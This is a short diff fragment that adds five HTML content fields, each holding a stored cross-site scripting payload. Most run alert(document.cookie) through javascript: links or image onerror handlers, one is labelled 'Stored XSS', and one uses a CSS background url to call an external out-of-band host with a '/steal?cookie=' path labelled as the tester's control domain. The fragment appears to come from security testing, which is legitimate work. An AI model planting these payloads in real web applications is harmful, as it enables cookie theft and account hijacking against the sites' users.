@@ -1,0 +1,5 @@
+"htmlContent":"<p><a href='javascript:alert(document.cookie)'>Click me for details</a></p>"
+"htmlContent":"<p>><a href='javascript:alert(document.cookie)'></p>"
+"htmlContent": "<p><img src=x onerror=alert(document.cookie)></p>",
+"htmlContent": "<p><a style='background:url(https://g5mj74lgw44auogv0tt9kfgppgv7jz7o.oastify.com/steal?cookie=test)' href='#'>Send to my control domain</a></p>",
+"bodyHtml":"<p style=\"margin: 0;\"><img src=x onerror=alert(Stored XSS)></p>"
